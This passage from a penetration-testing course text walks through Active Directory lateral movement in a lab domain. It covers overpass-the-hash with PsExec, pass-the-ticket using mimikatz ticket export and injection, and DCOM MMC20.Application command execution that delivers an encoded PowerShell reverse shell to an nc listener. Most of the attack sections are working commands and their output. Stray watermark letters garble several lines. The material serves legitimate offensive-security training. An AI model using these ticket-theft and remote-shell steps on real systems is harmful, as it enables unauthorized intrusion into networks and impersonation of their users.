z
No Kerberos tickets have been cached, but this is expected since jen has not yet performed an
interactive login. Let’s geneDrate a TGT by authenticating to a network share on the files04 server
with net use.
PS C:\Windows\system32> net use \\files04
The command completed successfully.
PS C:\Windows\system32> klist
Current LogonId is 0:0x17239e
Cached Tickets: (2)
#0> Client: jen @ CORP.COM
Server: krbtgt/CORP.COM @ CORP.COM
KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent
name_canonicalize
Start Time: 2/27/2023 5:27:28 (local)
End Time: 2/27/2023 15:27:28 (local)
Renew Time: 3/6/2023 5:27:28 (local)
Session Key Type: RSADSI RC4-HMAC(NT)
Cache Flags: 0x1 -> PRIMARY
Kdc Called: DC1.corp.com
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 789
Made in Morocco
Penetration Testing with Kali Linux
#1> Client: jen @ CORP.COM
Server: cifs/files04 @ CORP.COM
KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
Start Time: 2/27/2023 5:27:28 (local)
End Time: 2/27/2023 15:27:28 (local)
Renew Time: 3/6/2023 5:27:28 (local)
Session Key Type: AES-256-CTS-HMAC-SHA1-96
Cache Flags: 0
Kdc Called: DC1.corp.com
Listing 844 - Mapping a network share on a remote server and listing Kerberos tickets
The output indicates that the net use command was successful. We then used klist to list the
newly requested Kerberos tickets, including a TGT and a TGS for the Common Internet File
System (CIFS) service.
y
We used net use arbitrarily in this example, but we coukld have used any
command that requires domain permissions and would subsequently create a
TGS.
s
o
We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that
rely on Kerberos authentication (as opposed to NTLM) such as the official PsExec application
from Microsoft.1151 n
PsExec can run a command remotely but does not accept password hashes. Since we have
generated Kerberos tickets and opeirate in the context of jen in the PowerShell session, we may
reuse the TGT to obtain code execzution on the files04 host.
Let’s try that now, running .\PsExec.exe to launch cmd remotely on the \\files04 machine as jen.
D
PS C:\Windows\system32> cd C:\tools\SysinternalsSuite\
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd
PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32>whoami
corp\jen
C:\Windows\system32>hostname
FILES04
Listing 845- Opening remote connection using Kerberos
1151 (Microsoft, 2016), https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 790
Made in Morocco
Penetration Testing with Kali Linux
As evidenced by the output, we have successfully reused the Kerberos TGT to launch a command
shell on the files04 server.
Excellent! We have successfully upgraded a cached NTLM password hash to a Kerberos TGT to
gain remote code execution on behalf of another user.
23.1.5 Pass the Ticket
In the previous section, we used the overpass the hash technique (along with the captured NTLM
hash) to acquire a Kerberos TGT, allowing us to authenticate using Kerberos. We can only use the
TGT on the machine it was created for, but the TGS potentially offers more flexibility.
The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected
elsewhere on the network and then used to authenticate to a specific service. In addition, if the
service tickets belong to the current user, then no administrative privileges are required.
y
In this scenario, we are going to abuse an already existing session of dave. The dave user has
privileged access to the backup folder located on WEB04 wherke our logged in user jen does not.
To demonstrate the attack angle, we are going to extract all the current TGT/TGS in memory and
s
inject dave’s WEB04 TGS into our own session. This will allow us to access the restricted folder.
Let’s first log in as jen to CLIENT76 and verify tohat we are unable to access the resource on
WEB04. To do so, we’ll try to list the content of the \\web04\backup folder from an administrative
PowerShell command line session.
n
PS C:\Windows\system32> whoami
corp\jen
i
PS C:\Windows\system32> ls \\web04\backup
z
ls : Access to the path '\\web04\backup' is denied.
At line:1 char:1
+ ls \\web04\backup
D
+ ~~~~~~~~~~~~~~~~~
+ CategoryInfo : PermissionDenied: (\\web04\backup:String) [Get-
ChildItem], UnauthorizedAccessException
+ FullyQualifiedErrorId :
DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
Listing 846 - Verifying that the user jen has no access to the shared folder
Confirming that jen has no access to the restricted folder, we can now launch mimikatz, enable
debug privileges, and export all the TGT/TGS from memory with the sekurlsa::tickets /export
command.
mimikatz #privilege::debug
Privilege '20' OK
mimikatz #sekurlsa::tickets /export
Authentication Id : 0 ; 2037286 (00000000:001f1626)
Session : Batch from 0
User Name : dave
Domain : CORP
Logon Server : DC1
Logon Time : 9/14/2022 6:24:17 AM
SID : S-1-5-21-1987370270-658905905-1781884369-1103
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 791
Made in Morocco
Penetration Testing with Kali Linux
* Username : dave
* Domain : CORP.COM
* Password : (null)
Group 0 - Ticket Granting Service
Group 1 - Client Ticket ?
Group 2 - Ticket Granting Ticket
[00000000]
Start/End/MaxRenew: 9/14/2022 6:24:17 AM ; 9/14/2022 4:24:17 PM ; 9/21/2022
6:24:17 AM
Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
Target Name (02) : krbtgt ; CORP ; @ CORP.COM
Client Name (01) : dave ; @ CORP.COM ( CORP ) y
Flags 40c10000 : name_canonicalize ; initial ; renewable ; forwardable ;
Session Key : 0x00000012 - aes256_hmac
f0259e075fa30e8476836936647cdabc719fe245ba2k9d4b60528f04196745fe6
Ticket : 0x00000012 - aes256_hmac ; kvno = 2 [...]
* Saved to file [0;1f1626]PI:EMAIL !
s
...
Listing 847 - Exporting Kerberos TGT/TGS to disk
o
The above command parsed the LSASS process space in memory for any TGT/TGS, which is
then saved to disk in the kirbi mimikatz format.
n
Because inspecting the generated tickets indicates that dave had initiated a session, we can try to
inject one of their tickets inside jen’s sessions.
i
We can verify newly generated ticzkets with dir, filtering out on the kirbi extension.
PS C:\Tools> dir *.kirbi
D
Directory: C:\Tools
Mode LastWriteTime Length Name
---- ------------- ------ ----
-a---- 9/14/2022 6:24 AM 1561 [0;12bd0]-0-0-40810000-dave@cifs-
web04.kirbi
-a---- 9/14/2022 6:24 AM 1505 [0;12bd0]-2-0-40c10000-dave@krbtgt-
CORP.COM.kirbi
-a---- 9/14/2022 6:24 AM 1561 [0;1c6860]-0-0-40810000-dave@cifs-
web04.kirbi
-a---- 9/14/2022 6:24 AM 1505 [0;1c6860]-2-0-40c10000-dave@krbtgt-
CORP.COM.kirbi
-a---- 9/14/2022 6:24 AM 1561 [0;1c7bcc]-0-0-40810000-dave@cifs-
web04.kirbi
-a---- 9/14/2022 6:24 AM 1505 [0;1c7bcc]-2-0-40c10000-dave@krbtgt-
CORP.COM.kirbi
-a---- 9/14/2022 6:24 AM 1561 [0;1c933d]-0-0-40810000-dave@cifs-
web04.kirbi
-a---- 9/14/2022 6:24 AM 1505 [0;1c933d]-2-0-40c10000-dave@krbtgt-
CORP.COM.kirbi
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 792
Made in Morocco
Penetration Testing with Kali Linux
-a---- 9/14/2022 6:24 AM 1561 [0;1ca6c2]-0-0-40810000-dave@cifs-
web04.kirbi
-a---- 9/14/2022 6:24 AM 1505 [0;1ca6c2]-2-0-40c10000-dave@krbtgt-
CORP.COM.kirbi
...
Listing 848 - Exporting Kerberos TGT/TGS to disk
As many tickets have been generated, we can just pick any TGS ticket in the dave@cifs-
web04.kirbi format and inject it through mimikatz via the kerberos::ptt command.
mimikatz # kerberos::ptt [0;12bd0]PI:EMAIL
* File: '[0;12bd0]PI:EMAIL': OK
Listing 849 - Injecting the selected TGS into process memory.
No errors have been thrown, meaning that we should expect the ticket in our session when
y
running klist.
k
PS C:\Tools> klist
Current LogonId is 0:0x13bca7
s
Cached Tickets: (1)
o
#0> Client: dave @ CORP.COM
Server: cifs/web04 @ CORP.COM
KerbTicket Encryption Type: AESn-256-CTS-HMAC-SHA1-96
Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
Start Time: 9/14/2022 5:31:32 (local)
End Time: 9/14/2022 15i:31:13 (local)
Renew Time: 9/21/2022 z5:31:13 (local)
Session Key Type: AES-256-CTS-HMAC-SHA1-96
Cache Flags: 0
D
Kdc Called:
Listing 850 - Inspecting the injected ticket in memory
We notice that the dave ticket has been successfully imported in our own session for the jen user.
Let’s confirm we have been granted access to the restricted shared folder.
PS C:\Tools> ls \\web04\backup
Directory: \\web04\backup
Mode LastWriteTime Length Name
---- ------------- ------ ----
-a---- 9/13/2022 2:52 AM 0 backup_schemata.txt
Listing 851 - Accessing the shared folder through the injected ticket
Awesome! We managed to successfully access the folder by impersonating dave’s identity after
injecting its authentication token into our user’s process.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 793
Made in Morocco
Penetration Testing with Kali Linux
23.1.6 DCOM
In this section, we will inspect a fairly recent lateral movement technique that exploits the
Distributed Component Object Model (DCOM)1152 and learn how it can be abused for lateral
movement.1153
The Microsoft Component Object Model (COM)1154 is a system for creating software components
that interact with each other. While COM was created for either same-process or cross-process
interaction, it was extended to Distributed Component Object Model (DCOM) for interaction
between multiple computers over a network.
Both COM and DCOM are very old technologies dating back to the very first editions of
Windows.1155 Interaction with DCOM is performed over RPC on TCP port 135 and local
administrator access is required to call the DCOM Service Control Manager, which is essentially
an API. y
Cyberason documented1156 a collection of various DCOM lateral movement techniques, including
k
one discovered by Matt Nelson,1157 which we are covering in this section.
The discovered DCOM lateral movement technique iss based on the Microsoft Management
Console (MMC)1158 COM application that is employed for scripted automation of Windows
systems.
o
The MMC Application Class allows the creation of Application Objects,1159 which expose the
ExecuteShellCommand method under the Document.ActiveView property. As its name suggests,
n
this method allows execution of any shell command as long as the authenticated user is
authorized, which is the default for local administrators.
i
We are going to demonstrate this lateral movement attack as the jen user logged in from the
z
already compromised Windows 11 CLIENT74 host.
From an elevated PowerSDhell prompt, we can instantiate a remote MMC 2.0 application by
specifying the target IP of FILES04 as the second argument of the GetTypeFromProgID method.
$dcom =
[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","19
2.168.50.73"))
Listing 852 - Remotely Instantiating the MMC Application object
1152 (Microsoft, 2022), https://msdn.microsoft.com/en-us/library/cc226801.aspx
1153 (MITRE, 2022), https://attack.mitre.org/techniques/T1021/003/
1154 (Microsoft, 2022), https://learn.microsoft.com/en-us/windows/win32/com/component-object-model--com--
portal?redirectedfrom=MSDN
1155 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Component_Object_Model
1156 (Cyberason, 2018), https://www.cybereason.com/blog/dcom-lateral-movement-techniques
1157 (Matt Nelson, 2017), https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
1158 (Microsoft, 2022), https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/microsoft-management-console-
start-page
1159 (Microsoft, 2022), https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/application-
object?redirectedfrom=MSDN
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 794
Made in Morocco
Penetration Testing with Kali Linux
Once the application object is saved into the $dcom variable, we can pass the required argument
to the application via the ExecuteShellCommand1160 method. The method accepts four
parameters: Command, Directory, Parameters, and WindowState. We’re only interested in the first
and third parameters, which will be populated with cmd and /c calc, respectively.
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
Listing 853 - Executing a command on the remote DCOM object
Once we execute these two PowerShell lines from CLIENT74, we should have spawned an
instance of the calculator app.
Because it’s within Session 0, we can verify the calculator app is running with tasklist and filtering
out the output with findstr.
C:\Users\Administrator>tasklist | findstr "calc"
y
win32calc.exe 4764 Services 0 12,132 K
Listing 854 - Veriyfing that calculator is running on FILES04
k
We can now improve our craft by extending this attack to a full reverse shell similar to what we
did in the WMI and WinRM section earlier in this Module.
s
Having generated the base64 encoded reverse shell with our Python script, we can replace our
DCOM payload with it.
o
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w
hidden -e n
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF
MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjiAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
Listing 855 - Adzding a reverse-shell as a DCOM payload on CLIENT74
Switching to our Kali machine, we can verify any incoming connections on the listener that we
simultaneously set up. D
kali@kali:~$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 50778
PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> hostname
FILES04